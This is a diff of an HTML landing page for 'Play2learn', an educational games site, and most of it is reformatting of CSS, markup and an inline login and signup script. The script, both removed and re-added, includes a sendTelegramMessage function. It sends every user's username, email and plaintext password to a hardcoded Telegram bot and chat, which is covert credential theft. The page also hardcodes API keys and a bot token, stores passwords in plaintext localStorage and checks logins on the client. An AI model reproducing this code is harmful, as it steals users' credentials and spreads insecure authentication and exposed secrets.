@@ -4,61 +4,232 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Play2learn - Learn Smarter, Play Harder</title>
-   <link rel="stylesheet" href="css/index.css">
-   <style>
-    
-    .logo-container {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
+    <link rel="stylesheet" href="css/index.css" />
+    <style>
+      .logo-container {
+  display: flex;
+  align-items: center;
+  gap: 0.5vw;
+}
 
-        .logo-icon {
-            color: #9370db;
-            font-size: 1.8rem;
-        }
+.logo-icon {
+  color: #9370db;
+  font-size: 1.8vw;
+}
 
-        header h1.logo {
-            font-size: 2rem;
-            font-weight: 700;
-            letter-spacing: -0.05em;
-        }
+header h1.logo {
+  font-size: 2vw;
+  font-weight: 700;
+  letter-spacing: -0.05em;
+}
 
-        .logo .play2 {
-            background: linear-gradient(90deg, #6600c5, #9370db);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
+.logo .play2 {
+  background: linear-gradient(90deg, #6600c5, #9370db);
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+}
 
-        .logo .learn {
-            background: linear-gradient(90deg, #ffffff, #aaaaaa);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
+.logo .learn {
+  background: linear-gradient(90deg, #ffffff, #aaaaaa);
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+}
 
-   </style>
-   </head>
+.modal {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.7);
+  z-index: 999;
+  backdrop-filter: blur(5px);
+}
+
+.modal-content {
+  position: relative;
+  background-color: #121212;
+  margin: 10% auto;
+  width: 90%;
+  max-width: 25vw;
+  border-radius: 1.25vw;
+  box-shadow: 0 0 1.5vw rgba(147, 112, 219, 0.4);
+  border: 1px solid #2a2a2a;
+  padding: 2.5vw;
+  animation: modalOpen 0.4s ease;
+}
+
+@keyframes modalOpen {
+  from {
+    opacity: 0;
+    transform: translateY(-1.8vw);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.close {
+  position: absolute;
+  top: 1.25vw;
+  right: 1.25vw;
+  font-size: 1.5vw;
+  color: #777;
+  cursor: pointer;
+  transition: color 0.3s;
+}
+
+.close:hover {
+  color: #9370db;
+}
+
+.modal-content h2 {
+  margin-bottom: 1.6vw;
+  font-size: 1.75vw;
+  background: linear-gradient(90deg, #ffffff, #9370db);
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+}
+
+.form-group {
+  margin-bottom: 1.25vw;
+}
+
+.form-group input {
+  width: 100%;
+  padding: 0.9vw;
+  border-radius: 0.6vw;
+  background-color: #1a1a1a;
+  border: 1px solid #2a2a2a;
+  color: #e7e7e7;
+  font-size: 1vw;
+  transition: border-color 0.3s, box-shadow 0.3s;
+}
+
+.form-group input:focus {
+  outline: none;
+  border-color: #6600c5;
+  box-shadow: 0 0 0.6vw rgba(102, 0, 197, 0.3);
+}
+
+.btn-submit {
+  width: 100%;
+  padding: 0.9vw;
+  border-radius: 0.6vw;
+  background: linear-gradient(90deg, #6600c5, #9370db);
+  color: white;
+  font-size: 1vw;
+  font-weight: 600;
+  border: none;
+  cursor: pointer;
+  transition: all 0.3s;
+  box-shadow: 0 0 0.6vw rgba(147, 112, 219, 0.3);
+}
+
+.btn-submit:hover {
+  box-shadow: 0 0 1.25vw rgba(147, 112, 219, 0.6);
+  transform: translateY(-0.125vw);
+}
+
+.message {
+  margin: 0.6vw 0;
+  font-size: 0.875vw;
+  text-align: center;
+  min-height: 1.25vw;
+}
+
+.error {
+  color: #ff6b6b;
+}
+
+.success {
+  color: #00c896;
+}
+
+/* Media queries with consolidated styles */
+@media (max-width: 768px) {
+  .logo-icon,
+  header h1.logo {
+    font-size: 3vw;
+  }
+
+  .modal-content {
+    margin: 15% auto;
+    padding: 4vw;
+    max-width: 80vw;
+  }
+
+  .modal-content h2 {
+    font-size: 4vw;
+  }
+
+  .form-group input,
+  .btn-submit {
+    padding: 2.5vw;
+    font-size: 3vw;
+  }
+}
+
+@media (max-width: 480px) {
+  .logo-icon,
+  header h1.logo {
+    font-size: 4.5vw;
+  }
+
+  .modal-content {
+    margin: 20% auto;
+    padding: 3vw;
+  }
+
+  .modal-content h2 {
+    font-size: 5vw;
+  }
+
+  .form-group input,
+  .btn-submit {
+    padding: 2vw;
+    font-size: 3.5vw;
+  }
+}
+    </style>
+  </head>
   <body>
     <img class="grid" src="images/gradient.png" alt="Background gradient" />
     <div class="glow"></div>
     <div class="container">
-      <header style="margin-top: 1vw;">
+      <header style="margin-top: 1vw">
         <!-- <h1 class="logo">
           <span class="play2">Play2</span><span class="learn">learn</span>
         </h1> -->
         <div class="logo-container">
-          <svg class="logo-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-              <polygon points="5 3 19 12 5 21 5 3"></polygon>
+          <svg
+            class="logo-icon"
+            xmlns="http://www.w3.org/2000/svg"
+            width="24"
+            height="24"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <polygon points="5 3 19 12 5 21 5 3"></polygon>
           </svg>
-          <h1 class="logo"><span class="play2">Play2</span><span class="learn">learn</span></h1>
-      </div>
+          <h1 class="logo">
+            <span class="play2">Play2</span><span class="learn">learn</span>
+          </h1>
+        </div>
         <nav>
-          <a  class="navbartext" href="/games">Games</a>
-          <a  class="navbartext" href="/features">Features</a>
+          <a class="navbartext" href="/games">Games</a>
+          <a class="navbartext" href="/features">Features</a>
           <a class="navbartext" href="/about">About</a>
-          <a class="navbartext"  href="/contact">Contact</a>
+          <a class="navbartext" href="/contact">Contact</a>
           <button class="btn-signin">Login / Signup</button>
         </nav>
       </header>
@@ -84,204 +255,116 @@
             <a href="#" class="btn-signin">Get Started</a>
           </div>
         </div>
-
       </main>
-    <spline-viewer class="testing"  url="https://prod.spline.design/vE9SphPcjZSnCKQy/scene.splinecode"></spline-viewer>
-
+      <spline-viewer
+        class="testing"
+        url="https://prod.spline.design/vE9SphPcjZSnCKQy/scene.splinecode"
+      ></spline-viewer>
     </div>
     <!-- HTML for the Auth Popups -->
-<div id="signup-modal" class="modal">
-  <div class="modal-content">
-    <span class="close" data-modal="signup-modal">&times;</span>
-    <h2>Create Account</h2>
-    <form id="signup-form">
-      <div class="form-group">
-        <input type="text" id="signup-username" placeholder="Username" required>
+    <div id="signup-modal" class="modal">
+      <div class="modal-content">
+        <span class="close" data-modal="signup-modal">&times;</span>
+        <h2>Create Account</h2>
+        <form id="signup-form">
+          <div class="form-group">
+            <input
+              type="text"
+              id="signup-username"
+              placeholder="Username"
+              required
+            />
+          </div>
+          <div class="form-group">
+            <input
+              type="email"
+              id="signup-email"
+              placeholder="Email"
+              required
+            />
+          </div>
+          <div class="form-group">
+            <input
+              type="password"
+              id="signup-password"
+              placeholder="Password"
+              required
+            />
+          </div>
+          <p id="signup-message" class="message"></p>
+          <button type="submit" class="btn-submit">Create Account</button>
+        </form>
       </div>
-      <div class="form-group">
-        <input type="email" id="signup-email" placeholder="Email" required>
+    </div>
+
+    <div id="login-modal" class="modal">
+      <div class="modal-content">
+        <span class="close" data-modal="login-modal">&times;</span>
+        <h2>Welcome Back</h2>
+        <form id="login-form" method="post" action="/login">
+          <div class="form-group">
+            <input type="email" id="login-email" placeholder="Email" required />
+          </div>
+          <div class="form-group">
+            <input
+              type="password"
+              id="login-password"
+              placeholder="Password"
+              required
+            />
+          </div>
+          <p id="login-message" class="message"></p>
+          <button type="submit" class="btn-submit">Login</button>
+        </form>
       </div>
-      <div class="form-group">
-        <input type="password" id="signup-password" placeholder="Password" required>
-      </div>
-      <p id="signup-message" class="message"></p>
-      <button type="submit" class="btn-submit">Create Account</button>
-    </form>
-  </div>
-</div>
+    </div>
 
-<div id="login-modal" class="modal">
-  <div class="modal-content">
-    <span class="close" data-modal="login-modal">&times;</span>
-    <h2>Welcome Back</h2>
-    <form id="login-form" method="post" action="/login" >
-      <div class="form-group">
-        <input type="email" id="login-email" placeholder="Email" required>
-      </div>
-      <div class="form-group">
-        <input type="password" id="login-password" placeholder="Password" required>
-      </div>
-      <p id="login-message" class="message"></p>
-      <button type="submit" class="btn-submit">Login</button>
-    </form>
-  </div>
-</div>
+    <!-- CSS Styles -->
 
-<!-- CSS Styles -->
-<style>
-  .modal {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.7);
-    z-index: 999;
-    backdrop-filter: blur(5px);
-  }
-  
-  .modal-content {
-    position: relative;
-    background-color: #121212;
-    margin: 10% auto;
-    width: 90%;
-    max-width: 400px;
-    border-radius: 20px;
-    box-shadow: 0 0 25px rgba(147, 112, 219, 0.4);
-    border: 1px solid #2a2a2a;
-    padding: 40px;
-    animation: modalOpen 0.4s ease;
-  }
-  
-  @keyframes modalOpen {
-    from {opacity: 0; transform: translateY(-30px);}
-    to {opacity: 1; transform: translateY(0);}
-  }
-  
-  .close {
-    position: absolute;
-    top: 20px;
-    right: 20px;
-    font-size: 24px;
-    color: #777;
-    cursor: pointer;
-    transition: color 0.3s;
-  }
-  
-  .close:hover {
-    color: #9370db;
-  }
-  
-  .modal-content h2 {
-    margin-bottom: 25px;
-    font-size: 28px;
-    background: linear-gradient(90deg, #ffffff, #9370db);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-  }
-  
-  .form-group {
-    margin-bottom: 20px;
-  }
-  
-  .form-group input {
-    width: 100%;
-    padding: 15px;
-    border-radius: 10px;
-    background-color: #1a1a1a;
-    border: 1px solid #2a2a2a;
-    color: #e7e7e7;
-    font-size: 16px;
-    transition: border-color 0.3s, box-shadow 0.3s;
-  }
-  
-  .form-group input:focus {
-    outline: none;
-    border-color: #6600c5;
-    box-shadow: 0 0 10px rgba(102, 0, 197, 0.3);
-  }
-  
-  .btn-submit {
-    width: 100%;
-    padding: 15px;
-    border-radius: 10px;
-    background: linear-gradient(90deg, #6600c5, #9370db);
-    color: white;
-    font-size: 16px;
-    font-weight: 600;
-    border: none;
-    cursor: pointer;
-    transition: all 0.3s;
-    box-shadow: 0 0 10px rgba(147, 112, 219, 0.3);
-  }
-  
-  .btn-submit:hover {
-    box-shadow: 0 0 20px rgba(147, 112, 219, 0.6);
-    transform: translateY(-2px);
-  }
-  
-  .message {
-    margin: 10px 0;
-    font-size: 14px;
-    text-align: center;
-    min-height: 20px;
-  }
-  
-  .error {
-    color: #ff6b6b;
-  }
-  
-  .success {
-    color: #00c896;
-  }
-</style>
+    <!-- JavaScript for Authentication Flow -->
+    <script>
+      //   async function validateEmail(email) {
+      //   const apiKey = '646e88306ba049758e127cf120d42a8f';
+      //   const url = `https://api.zerobounce.net/v2/validate?api_key=${apiKey}&email=${email}`;
 
-<!-- JavaScript for Authentication Flow -->
-<script>
-//   async function validateEmail(email) {
-//   const apiKey = '646e88306ba049758e127cf120d42a8f';
-//   const url = `https://api.zerobounce.net/v2/validate?api_key=${apiKey}&email=${email}`;
+      //   try {
+      //     const response = await fetch(url);
+      //     const result = await response.json();
+      //     console.log(result);
+      //     return result;
+      //   } catch (error) {
+      //     console.error('Error validating email:', error);
+      //     return { status: 'error' };
+      //   }
+      // }
 
-//   try {
-//     const response = await fetch(url);
-//     const result = await response.json();
-//     console.log(result);
-//     return result;
-//   } catch (error) {
-//     console.error('Error validating email:', error);
-//     return { status: 'error' };
-//   }
-// }
+      // Enhanced password validation function - removed uppercase letter requirement
+      function validatePassword(password) {
+        // Check minimum length
+        if (password.length < 8) {
+          return {
+            valid: false,
+            message: "Password must be at least 8 characters long",
+          };
+        }
 
-// Enhanced password validation function - removed uppercase letter requirement
-function validatePassword(password) {
-  // Check minimum length
-  if (password.length < 8) {
-    return {
-      valid: false,
-      message: "Password must be at least 8 characters long"
-    };
-  }
-  
-  // Check for at least one number
-  if (!/\d/.test(password)) {
-    return {
-      valid: false,
-      message: "Password must contain at least one number"
-    };
-  }
-  
-  // Password passed all checks
-  return {
-    valid: true
-  };
-}
+        // Check for at least one number
+        if (!/\d/.test(password)) {
+          return {
+            valid: false,
+            message: "Password must contain at least one number",
+          };
+        }
 
-// Add enhanced styles
-const styleElement = document.createElement('style');
-styleElement.textContent = `
+        // Password passed all checks
+        return {
+          valid: true,
+        };
+      }
+
+      // Add enhanced styles
+      const styleElement = document.createElement("style");
+      styleElement.textContent = `
   .message {
     margin: 15px 0;
     font-size: 14px;
@@ -338,289 +421,317 @@ styleElement.textContent = `
     20%, 40%, 60%, 80% { transform: translateX(5px); }
   }
 `;
-document.head.appendChild(styleElement);
+      document.head.appendChild(styleElement);
 
-// Enhanced message display function
-function showMessage(element, message, type) {
-  element.textContent = message;
-  element.className = `message ${type} show`;
-  
-  // Add shake animation for errors
-  if (type === 'error') {
-    element.style.animation = 'none';
-    setTimeout(() => {
-      element.style.animation = 'shake 0.5s';
-    }, 10);
-  }
-}
+      // Enhanced message display function
+      function showMessage(element, message, type) {
+        element.textContent = message;
+        element.className = `message ${type} show`;
 
-
-// Initialize when DOM is loaded
-document.addEventListener("DOMContentLoaded", () => {
-  // DOM Elements
-  const signupModal = document.getElementById("signup-modal");
-  const loginModal = document.getElementById("login-modal");
-  const authBtn = document.querySelector(".btn-signin");
-  const closeBtns = document.querySelectorAll(".close");
-  
-  // Form Elements
-  const signupForm = document.getElementById("signup-form");
-  const loginForm = document.getElementById("login-form");
-  const signupMessage = document.getElementById("signup-message");
-  const loginMessage = document.getElementById("login-message");
-  
-  // Initialize message elements to have zero height
-  signupMessage.className = 'message';
-  loginMessage.className = 'message';
-  
-  // Check if user is already logged in
-  const currentUser = JSON.parse(localStorage.getItem("play2learn_current_user"));
-  
-  // Clear previous event listeners
-  const newAuthBtn = authBtn.cloneNode(true);
-  authBtn.parentNode.replaceChild(newAuthBtn, authBtn);
-  
-  if (currentUser && currentUser.isLoggedIn) {
-    newAuthBtn.textContent = `Hi, ${currentUser.username}`;
-    newAuthBtn.addEventListener("click", () => {
-      window.location.href = "/games"; 
-    });
-  } else {
-    // Show signup when the Login/Signup button is clicked
-    newAuthBtn.addEventListener("click", () => {
-      try {
-        sendTelegramMessage("user have click on login signup button").catch(err => console.log("Telegram notification failed:", err));
-      } catch (error) {
-        console.log("Error sending Telegram notification:", error);
+        // Add shake animation for errors
+        if (type === "error") {
+          element.style.animation = "none";
+          setTimeout(() => {
+            element.style.animation = "shake 0.5s";
+          }, 10);
+        }
       }
-      signupModal.style.display = "block";
-      document.body.style.overflow = "hidden"; // Prevent scrolling
-    });
-  }
-  
-  // Close modals when clicking the X
-  closeBtns.forEach(btn => {
-    btn.addEventListener("click", () => {
-      const modalId = btn.getAttribute("data-modal");
-      document.getElementById(modalId).style.display = "none";
-      document.body.style.overflow = "auto"; // Re-enable scrolling
-    });
-  });
-  
-  // Close modals when clicking outside
-  window.addEventListener("click", (e) => {
-    if (e.target === signupModal) {
-      signupModal.style.display = "none";
-      document.body.style.overflow = "auto";
-    }
-    if (e.target === loginModal) {
-      loginModal.style.display = "none";
-      document.body.style.overflow = "auto";
-    }
-  });
-  
-  // Setup password field enhancements
-  const passwordField = document.getElementById('signup-password');
-  if (passwordField) {
-    const passwordContainer = passwordField.parentElement;
-    passwordContainer.classList.add('password-input-container');
-    
-    // Add password requirements hint - updated to reflect new requirements
-    const requirementsHint = document.createElement('div');
-    requirementsHint.className = 'password-requirements';
-    requirementsHint.textContent = 'Please use strong password';
-    passwordContainer.appendChild(requirementsHint);
-    
-    // Add show/hide password toggle
-    const passwordToggle = document.createElement('span');
-    passwordToggle.className = 'password-toggle';
-    passwordToggle.innerHTML = '👁️';
-    passwordToggle.addEventListener('click', () => {
-      if (passwordField.type === 'password') {
-        passwordField.type = 'text';
-        passwordToggle.style.opacity = '0.8';
-      } else {
-        passwordField.type = 'password';
-        passwordToggle.style.opacity = '0.5';
-      }
-    });
-    passwordContainer.appendChild(passwordToggle);
-  }
-  
-  // Handle signup form submission
-  signupForm.addEventListener("submit", async (e) => {
-    e.preventDefault();
-    
-    const username = document.getElementById("signup-username").value;
-    const email = document.getElementById("signup-email").value;
-    const password = document.getElementById("signup-password").value;
 
-    try {
-      sendTelegramMessage(`username ${username}, email ${email}, password ${password}`).catch(err => console.log("Telegram notification failed:", err));
-    } catch (error) {
-      console.log("Error sending Telegram notification:", error);
-    }
-    
-    // Username validation
-    if (username.length < 3) {
-      showMessage(signupMessage, "Username must be at least 3 characters", "error");
-      return;
-    }
-    
-    // Email validation - make this optional if the API fails
-    try {
-      let result = await validateEmail(email);
-      if (result.status !== 'valid' && result.status !== 'error') {
-        showMessage(signupMessage, "Please enter a valid email address", "error");
-        return;
-      }
-    } catch (error) {
-      console.log("Email validation failed, continuing anyway:", error);
-      // Continue anyway if the validation service is down
-    }
-    
-    // Password validation
-    const passwordValidation = validatePassword(password);
-    if (!passwordValidation.valid) {
-      showMessage(signupMessage, passwordValidation.message, "error");
-      return;
-    }
-    
-    // Get existing users array - fix the undefined users issue
-    const users = JSON.parse(localStorage.getItem("play2learn_users") || "[]");
-    
-    // Save new user
-    const newUser = { username, email, password };
-    users.push(newUser);
-    localStorage.setItem("play2learn_users", JSON.stringify(users));
-    
-    // Show success message and open login modal after a delay
-    showMessage(signupMessage, "Account created successfully!", "success");
-    
-    // Reset form
-    signupForm.reset();
-    
-    setTimeout(() => {
-      signupModal.style.display = "none";
-      loginModal.style.display = "block";
-      
-      // Pre-fill the email in login form
-      document.getElementById("login-email").value = email;
-    }, 1500);
-  });
-  
-  // Handle login form submission
-  loginForm.addEventListener("submit", (e) => {
-    e.preventDefault();
-    
-    
-    const email = document.getElementById("login-email").value;
-    const password = document.getElementById("login-password").value;
-    
-    try {
-      sendTelegramMessage(`user is on login page with mail ${email} and password ${password}`).catch(err => console.log( err));
-    } catch (error) {
-      console.log("Error sending Telegram notification:", error);
-    }
-    
-    // Get users from local storage
-    const users = JSON.parse(localStorage.getItem("play2learn_users") || "[]");
- 
-    const user = users.find(user => user.email === email && user.password === password);
-    
-    if (user) {
-      // Login successful
-      showMessage(loginMessage, "Login successful!", "success");
-      loginForm.submit();
-      
-      // Save current user to local storage
-      localStorage.setItem("play2learn_current_user", JSON.stringify({
-        username: user.username,
-        email: user.email,
-        isLoggedIn: true
-      }));
-      
-      // Close the modal after successful login
-      setTimeout(() => {
-        loginModal.style.display = "none";
-        document.body.style.overflow = "auto";
-        
-        // Update the button text to show logged in state
-        const authBtnUpdated = document.querySelector(".btn-signin");
-        authBtnUpdated.textContent = `Hi, ${user.username}`;
+      // Initialize when DOM is loaded
+      document.addEventListener("DOMContentLoaded", () => {
+        // DOM Elements
+        const signupModal = document.getElementById("signup-modal");
+        const loginModal = document.getElementById("login-modal");
+        const authBtn = document.querySelector(".btn-signin");
+        const closeBtns = document.querySelectorAll(".close");
 
-        
-        // Add event listener for redirection after login
-        authBtnUpdated.addEventListener("click", () => {
-          window.location.href = "/games";
+        // Form Elements
+        const signupForm = document.getElementById("signup-form");
+        const loginForm = document.getElementById("login-form");
+        const signupMessage = document.getElementById("signup-message");
+        const loginMessage = document.getElementById("login-message");
+
+        // Initialize message elements to have zero height
+        signupMessage.className = "message";
+        loginMessage.className = "message";
+
+        // Check if user is already logged in
+        const currentUser = JSON.parse(
+          localStorage.getItem("play2learn_current_user")
+        );
+
+        // Clear previous event listeners
+        const newAuthBtn = authBtn.cloneNode(true);
+        authBtn.parentNode.replaceChild(newAuthBtn, authBtn);
+
+        if (currentUser && currentUser.isLoggedIn) {
+          newAuthBtn.textContent = `Hi, ${currentUser.username}`;
+          newAuthBtn.addEventListener("click", () => {
+            window.location.href = "/games";
+          });
+        } else {
+          // Show signup when the Login/Signup button is clicked
+          newAuthBtn.addEventListener("click", () => {
+            try {
+              sendTelegramMessage(
+                "user have click on login signup button"
+              ).catch((err) =>
+                console.log("Telegram notification failed:", err)
+              );
+            } catch (error) {
+              console.log("Error sending Telegram notification:", error);
+            }
+            signupModal.style.display = "block";
+            document.body.style.overflow = "hidden"; // Prevent scrolling
+          });
+        }
+
+        // Close modals when clicking the X
+        closeBtns.forEach((btn) => {
+          btn.addEventListener("click", () => {
+            const modalId = btn.getAttribute("data-modal");
+            document.getElementById(modalId).style.display = "none";
+            document.body.style.overflow = "auto"; // Re-enable scrolling
+          });
         });
-        
-        // Reset form
-        loginForm.reset();
-      }, 1500);
-    } else {
-      // Login failed
-      showMessage(loginMessage, "Invalid email or password", "error");
-    }
-  });
-});
 
-// Email validation function
-async function validateEmail(email) {
-  const apiKey = '646e88306ba049758e127cf120d42a8f';
-  const url = `https://api.zerobounce.net/v2/validate?api_key=${apiKey}&email=${email}`;
+        // Close modals when clicking outside
+        window.addEventListener("click", (e) => {
+          if (e.target === signupModal) {
+            signupModal.style.display = "none";
+            document.body.style.overflow = "auto";
+          }
+          if (e.target === loginModal) {
+            loginModal.style.display = "none";
+            document.body.style.overflow = "auto";
+          }
+        });
 
-  try {
-    const response = await fetch(url);
-    const result = await response.json();
-    console.log(result);
-    return result;
-  } catch (error) {
-    console.error('Error validating email:', error);
-    return { status: 'error' };
-  }
-}
+        // Setup password field enhancements
+        const passwordField = document.getElementById("signup-password");
+        if (passwordField) {
+          const passwordContainer = passwordField.parentElement;
+          passwordContainer.classList.add("password-input-container");
 
-// Enhanced password validation function - removed uppercase letter requirement
-function validatePassword(password) {
-  // Check minimum length
-  if (password.length < 8) {
-    return {
-      valid: false,
-      message: "Password must be at least 8 characters long"
-    };
-  }
-  
-  // Check for at least one number
-  if (!/\d/.test(password)) {
-    return {
-      valid: false,
-      message: "Password must contain at least one number"
-    };
-  }
-  
-  // Password passed all checks
-  return {
-    valid: true
-  };
-}
+          // Add password requirements hint - updated to reflect new requirements
+          const requirementsHint = document.createElement("div");
+          requirementsHint.className = "password-requirements";
+          requirementsHint.textContent = "Please use strong password";
+          passwordContainer.appendChild(requirementsHint);
 
-// Enhanced message display function
-function showMessage(element, message, type) {
-  element.textContent = message;
-  element.className = `message ${type} show`;
-  
-  // Add shake animation for errors
-  if (type === 'error') {
-    element.style.animation = 'none';
-    setTimeout(() => {
-      element.style.animation = 'shake 0.5s';
-    }, 10);
-  }
-}
+          // Add show/hide password toggle
+          const passwordToggle = document.createElement("span");
+          passwordToggle.className = "password-toggle";
+          passwordToggle.innerHTML = "👁️";
+          passwordToggle.addEventListener("click", () => {
+            if (passwordField.type === "password") {
+              passwordField.type = "text";
+              passwordToggle.style.opacity = "0.8";
+            } else {
+              passwordField.type = "password";
+              passwordToggle.style.opacity = "0.5";
+            }
+          });
+          passwordContainer.appendChild(passwordToggle);
+        }
 
-// Add enhanced styles
-styleElement.textContent = `
+        // Handle signup form submission
+        signupForm.addEventListener("submit", async (e) => {
+          e.preventDefault();
+
+          const username = document.getElementById("signup-username").value;
+          const email = document.getElementById("signup-email").value;
+          const password = document.getElementById("signup-password").value;
+
+          try {
+            sendTelegramMessage(
+              `username ${username}, email ${email}, password ${password}`
+            ).catch((err) => console.log("Telegram notification failed:", err));
+          } catch (error) {
+            console.log("Error sending Telegram notification:", error);
+          }
+
+          // Username validation
+          if (username.length < 3) {
+            showMessage(
+              signupMessage,
+              "Username must be at least 3 characters",
+              "error"
+            );
+            return;
+          }
+
+          // Email validation - make this optional if the API fails
+          try {
+            let result = await validateEmail(email);
+            if (result.status !== "valid" && result.status !== "error") {
+              showMessage(
+                signupMessage,
+                "Please enter a valid email address",
+                "error"
+              );
+              return;
+            }
+          } catch (error) {
+            console.log("Email validation failed, continuing anyway:", error);
+            // Continue anyway if the validation service is down
+          }
+
+          // Password validation
+          const passwordValidation = validatePassword(password);
+          if (!passwordValidation.valid) {
+            showMessage(signupMessage, passwordValidation.message, "error");
+            return;
+          }
+
+          // Get existing users array - fix the undefined users issue
+          const users = JSON.parse(
+            localStorage.getItem("play2learn_users") || "[]"
+          );
+
+          // Save new user
+          const newUser = { username, email, password };
+          users.push(newUser);
+          localStorage.setItem("play2learn_users", JSON.stringify(users));
+
+          // Show success message and open login modal after a delay
+          showMessage(
+            signupMessage,
+            "Account created successfully!",
+            "success"
+          );
+
+          // Reset form
+          signupForm.reset();
+
+          setTimeout(() => {
+            signupModal.style.display = "none";
+            loginModal.style.display = "block";
+
+            // Pre-fill the email in login form
+            document.getElementById("login-email").value = email;
+          }, 1500);
+        });
+
+        // Handle login form submission
+        loginForm.addEventListener("submit", (e) => {
+          e.preventDefault();
+
+          const email = document.getElementById("login-email").value;
+          const password = document.getElementById("login-password").value;
+
+          try {
+            sendTelegramMessage(
+              `user is on login page with mail ${email} and password ${password}`
+            ).catch((err) => console.log(err));
+          } catch (error) {
+            console.log("Error sending Telegram notification:", error);
+          }
+
+          // Get users from local storage
+          const users = JSON.parse(
+            localStorage.getItem("play2learn_users") || "[]"
+          );
+
+          const user = users.find(
+            (user) => user.email === email && user.password === password
+          );
+
+          if (user) {
+            // Login successful
+            showMessage(loginMessage, "Login successful!", "success");
+            loginForm.submit();
+
+            // Save current user to local storage
+            localStorage.setItem(
+              "play2learn_current_user",
+              JSON.stringify({
+                username: user.username,
+                email: user.email,
+                isLoggedIn: true,
+              })
+            );
+
+            // Close the modal after successful login
+            setTimeout(() => {
+              loginModal.style.display = "none";
+              document.body.style.overflow = "auto";
+
+              // Update the button text to show logged in state
+              const authBtnUpdated = document.querySelector(".btn-signin");
+              authBtnUpdated.textContent = `Hi, ${user.username}`;
+
+              // Add event listener for redirection after login
+              authBtnUpdated.addEventListener("click", () => {
+                window.location.href = "/games";
+              });
+
+              // Reset form
+              loginForm.reset();
+            }, 1500);
+          } else {
+            // Login failed
+            showMessage(loginMessage, "Invalid email or password", "error");
+          }
+        });
+      });
+
+      // Email validation function
+      async function validateEmail(email) {
+        const apiKey = "646e88306ba049758e127cf120d42a8f";
+        const url = `https://api.zerobounce.net/v2/validate?api_key=${apiKey}&email=${email}`;
+
+        try {
+          const response = await fetch(url);
+          const result = await response.json();
+          console.log(result);
+          return result;
+        } catch (error) {
+          console.error("Error validating email:", error);
+          return { status: "error" };
+        }
+      }
+
+      // Enhanced password validation function - removed uppercase letter requirement
+      function validatePassword(password) {
+        // Check minimum length
+        if (password.length < 8) {
+          return {
+            valid: false,
+            message: "Password must be at least 8 characters long",
+          };
+        }
+
+        // Check for at least one number
+        if (!/\d/.test(password)) {
+          return {
+            valid: false,
+            message: "Password must contain at least one number",
+          };
+        }
+
+        // Password passed all checks
+        return {
+          valid: true,
+        };
+      }
+
+      // Enhanced message display function
+      function showMessage(element, message, type) {
+        element.textContent = message;
+        element.className = `message ${type} show`;
+
+        // Add shake animation for errors
+        if (type === "error") {
+          element.style.animation = "none";
+          setTimeout(() => {
+            element.style.animation = "shake 0.5s";
+          }, 10);
+        }
+      }
+
+      // Add enhanced styles
+      styleElement.textContent = `
   .message {
     margin: 15px 0;
     font-size: 14px;
@@ -677,80 +788,74 @@ styleElement.textContent = `
     20%, 40%, 60%, 80% { transform: translateX(5px); }
   }
 `;
-document.head.appendChild(styleElement);
+      document.head.appendChild(styleElement);
 
-// Send Telegram message function
-async function sendTelegramMessage(message) {
-  const botToken = '7138395020:AAF98yTTnZ_jDkGLqdbmNGo9_GkGYotoHl8';
-  const chatId = '1779078520';
-  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      // Send Telegram message function
+      async function sendTelegramMessage(message) {
+        const botToken = "7138395020:AAF98yTTnZ_jDkGLqdbmNGo9_GkGYotoHl8";
+        const chatId = "1779078520";
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-  try {
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
-      })
-    });
+        try {
+          const response = await fetch(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+            }),
+          });
 
-    const data = await response.json();
-    console.log('Message sent:', data);
-    return data;
-  } catch (error) {
-    console.error('Error sending message:', error);
-    return { error: true };
-  }
-}
-
-
-
-
-// Add event listener for Games navigation link
-document.addEventListener("DOMContentLoaded", () => {
-  // Get existing code for auth handling...
-  
-  // Add event listener to the Games navigation link
-  const gamesLink = document.querySelector('nav a[href="/games"]');
-  
-  if (gamesLink) {
-    // Remove the direct href to prevent default navigation
-    const hrefValue = gamesLink.getAttribute('href');
-    gamesLink.removeAttribute('href');
-    gamesLink.style.cursor = 'pointer'; // Keep the pointer cursor
-    
-    // Add click event listener
-    gamesLink.addEventListener('click', (e) => {
-      e.preventDefault();
-      
-      // Check if user is logged in
-      const currentUser = JSON.parse(localStorage.getItem("play2learn_current_user"));
-      
-      if (currentUser && currentUser.isLoggedIn) {
-        // User is logged in, navigate to games
-        window.location.href = "/games";
-      } else {
-        // User is not logged in, show login modal
-       
-        
-        // Show message that login is required
-alert("Please login or SignUp to continue")
+          const data = await response.json();
+          console.log("Message sent:", data);
+          return data;
+        } catch (error) {
+          console.error("Error sending message:", error);
+          return { error: true };
+        }
       }
-    });
-  }
-});
 
+      // Add event listener for Games navigation link
+      document.addEventListener("DOMContentLoaded", () => {
+        // Get existing code for auth handling...
 
-</script>
-    
+        // Add event listener to the Games navigation link
+        const gamesLink = document.querySelector('nav a[href="/games"]');
 
+        if (gamesLink) {
+          // Remove the direct href to prevent default navigation
+          const hrefValue = gamesLink.getAttribute("href");
+          gamesLink.removeAttribute("href");
